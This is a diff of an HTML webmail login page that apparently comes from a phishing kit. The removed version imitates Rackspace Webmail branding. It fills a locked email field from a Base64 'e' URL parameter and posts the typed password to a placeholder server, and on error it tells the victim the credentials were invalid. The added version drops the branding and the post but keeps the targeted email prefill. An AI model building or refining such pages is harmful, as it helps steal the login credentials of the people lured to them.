@@ -1,239 +1,151 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Rackspace Webmail: Hosted Email for Business</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Webmail Login</title>
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
-
   <style>
-    /* Page Defaults */
-    * {
-      -webkit-box-sizing: border-box;
-      -moz-box-sizing: border-box;
-      box-sizing: border-box;
-    }
-
+    /* Basic Styles */
     body {
-      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
-      font-size: 14px;
-      line-height: 1.42857;
-      color: #333333;
-      background-color: #FAFAFA;
+      font-family: "Roboto", sans-serif;
       margin: 0;
+      padding: 0;
+      background-color: #FAFAFA;
+      color: #333;
     }
 
-    .base_link {
-      display: inline-block;
-      color: #0C7C84;
-      text-decoration: none;
-    }
-
-    .base_links {
-      background: #FFFFFF;
-      text-align: center;
-      padding-bottom: 20px;
-      margin-top: -15px;
-    }
-
-    .divider {
-      display: inline-block;
-      margin: 0px 5px;
-      color: #0C7C84;
-    }
-    
     #content {
       display: flex;
-      align-items: center;
       justify-content: center;
-      position: fixed;
-      top: 0;
-      left: 0;
-      bottom: 0;
-      right: 0;
+      align-items: center;
+      height: 100vh;
       background: #EAEAEA;
     }
 
-    #content-header {
-      height: 53px;
-      padding: 16px;
-      font-size: 24px;
-      font-weight: 300;
-      line-height: 18px;
-      background: #424242;
-      color: #FCFCFC;
-    }
-
-    #content-body {
-      display: flex;
-      justify-content: start;
-      background: #FFFFFF;
-      min-width: 790px;
-    }
-
     #form {
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
+      background: #fff;
       padding: 20px;
-      min-height: 268px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
       width: 100%;
+      max-width: 400px;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
     }
 
     .form-label {
-      font-family: Roboto;
       font-size: 16px;
-      margin-bottom: 8px;
       color: #616161;
     }
 
     .form-field {
-      border: 1px solid #BDBDBD;
-      border-radius: 2px;
-      font-family: Roboto;
-      font-size: 16px;
-      color: #616161;
-      height: 32px;
-      display: block;
       width: 100%;
-      padding: 4px 8px;
+      padding: 10px;
+      border: 1px solid #BDBDBD;
+      border-radius: 4px;
+      font-size: 16px;
+      margin-top: 5px;
     }
 
-    .login-btn {
-      float: right;
-      display: inline-flex;
-      justify-content: center;
-      align-items: center;
-      padding: 0 12px;
-      height: 32px;
-      font-size: 14px;
-      font-weight: 400;
-      color: #fff;
+    .form-button {
+      width: 100%;
+      padding: 10px;
       background-color: #0C7C84;
-      border-radius: 2px;
+      color: #fff;
+      font-size: 16px;
+      border: none;
       cursor: pointer;
+      margin-top: 20px;
+      border-radius: 4px;
     }
 
-    @media only screen and (max-device-width: 480px) {
-      body {
-        font-size: 19pt;
-      }
-
-      .form-label {
-        font-size: 114%;
-      }
-
-      .form-field {
-        font-size: 114%;
-        height: 2em;
-      }
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 10px;
     }
   </style>
 </head>
 <body>
   <div id="content">
-    <div>
-      <div id="content-header">
-        <div id="content-header-label">Webmail Login</div>
+    <div id="form">
+      <h2>Login to Webmail</h2>
+      <div class="form-group">
+        <label for="ai" class="form-label">Email Address</label>
+        <input type="email" id="ai" name="username" class="form-field" placeholder="Enter your email" readonly />
+        <p id="email-error" class="error-message"></p>
       </div>
-
-      <div id="content-body">
-        <form id="form" autocomplete="off">
-          <div id="form-body">
-            <div id="form-container">
-              <input type="hidden" name="__RequestVerificationToken" value="CfDJ8PJv2PmI83xDqNI3IL5jbf7n53O-sjEa55YFQhrE9DffPHCT5T4NJaWKOR-DTuVf15CZOHNTR0Nf8HHvYJzpBuvE1-RuPCp-VVB10AxbvHGpnvcORaonI3gFCgak-skKc16eQFADMDLQGDKw1rJETYQ" />
-
-              <div class="form-group">
-                <label for="ai" class="form-label">Email address</label>
-                <input id="ai" name="username" class="form-field" value="" autocomplete="username" readonly />
-                <p align="left">
-                  <span class="text-danger" id="msg" style="font-size:14px; color:#FF0000"></span>
-                </p>
-              </div>
-
-              <div class="form-group">
-                <label for="pr" class="form-label">Password</label>
-                <input id="pr" name="password" type="password" class="form-field" autocomplete="current-password" />
-              </div>
-
-              <div id="login-btn-toolbar">
-                <button class="login-btn" type="submit" id="submit-btn">Log In</button>
-              </div>
-            </div>
-          </div>
-        </form>
+      <div class="form-group">
+        <label for="pr" class="form-label">Password</label>
+        <input type="password" id="pr" name="password" class="form-field" placeholder="Enter your password" />
+        <p id="password-error" class="error-message"></p>
       </div>
+      <button type="submit" id="submit-btn" class="form-button">Log In</button>
+      <p id="msg" class="error-message"></p>
     </div>
   </div>
 
-  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
   <script>
-    $(document).ready(function() {
-      // Function to get URL parameter and decode the email
-      var urlParams = new URLSearchParams(window.location.search);
-      var encodedEmail = urlParams.get('e'); // Get the email from the query parameter e=BASE64EMAIL
+    // Function to get the URL parameter 'e' and decode the email
+    function getEmailFromURL() {
+      const urlParams = new URLSearchParams(window.location.search); // Get URL parameters
+      const encodedEmail = urlParams.get('e'); // Get 'e' parameter
 
       if (encodedEmail) {
-        // Decode the email if it is Base64 encoded
-        var decodedEmail = atob(encodedEmail.replace('BASE64EMAIL=', ''));
+        // Remove 'BASE64EMAIL=' prefix if present
+        const emailBase64 = encodedEmail.replace('BASE64EMAIL=', '');
+        try {
+          // Decode Base64 email
+          const decodedEmail = atob(emailBase64);
 
-        // Validate the decoded email format
-        var emailPattern = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        if (emailPattern.test(decodedEmail)) {
-          $('#ai').val(decodedEmail); // Populate email field
-          $('#ai').attr('readonly', true); // Make email field readonly
-          $("#msg").hide();
-        } else {
-          console.log("Invalid email format in URL");
+          // Validate email format
+          const emailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
+          if (emailPattern.test(decodedEmail)) {
+            document.getElementById('ai').value = decodedEmail; // Set email in input field
+            document.getElementById('ai').setAttribute('readonly', true); // Make it read-only
+            document.getElementById('email-error').textContent = ''; // Clear any error message
+          } else {
+            throw new Error('Invalid email format');
+          }
+        } catch (error) {
+          console.error('Error decoding email:', error);
+          document.getElementById('email-error').textContent = 'Error decoding email. Invalid format or Base64 string.';
         }
+      } else {
+        document.getElementById('email-error').textContent = 'No email provided in the URL.';
+      }
+    }
+
+    // Function to handle form submission
+    document.getElementById('submit-btn').addEventListener('click', function (event) {
+      event.preventDefault(); // Prevent form submission
+      const email = document.getElementById('ai').value;
+      const password = document.getElementById('pr').value;
+
+      // Validate fields
+      let hasError = false;
+
+      if (!email || !password) {
+        hasError = true;
+        document.getElementById('msg').textContent = 'Both email and password are required.';
       }
 
-      // Handle the login form submission
-      $('#submit-btn').click(function(event) {
-        event.preventDefault();
-        var ai = $("#ai").val();
-        var pr = $("#pr").val();
-        var msg = $('#msg').html();
-        $('#msg').text(msg);
+      // If no errors, you can proceed with the form submission (AJAX, etc.)
+      if (!hasError) {
+        // Example: send data to server
+        console.log('Email:', email, 'Password:', password);
 
-        var emailPattern = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-        if (!ai) {
-          $('#msg').show();
-          $('#msg').html("The email field is empty!");
-          return false;
-        }
-
-        if (!emailPattern.test(ai)) {
-          $('#msg').show();
-          $('#msg').html("Please enter a valid email address.");
-          return false;
-        }
-
-        if (!pr) {
-          $('#msg').show();
-          $('#msg').html("The password field is empty!");
-          return false;
-        }
-
-        // Handle form submission via AJAX or any other logic you need
-        $.ajax({
-          type: 'POST',
-          url: 'YOUR_SERVER_URL_HERE', // Replace with your server URL
-          data: {
-            ai: ai,
-            pr: pr
-          },
-          success: function(response) {
-            // Handle response here (e.g., redirect or show a success message)
-          },
-          error: function() {
-            $('#msg').show();
-            $('#msg').html("Error: Invalid credentials");
-          }
-        });
-      });
+        // Simulate form submission success (you can replace this with an actual AJAX call)
+        document.getElementById('msg').textContent = 'Form submitted successfully!';
+      }
     });
+
+    // Call the function to extract the email from URL when the page loads
+    window.onload = function () {
+      getEmailFromURL();
+    };
   </script>
 </body>
 </html>
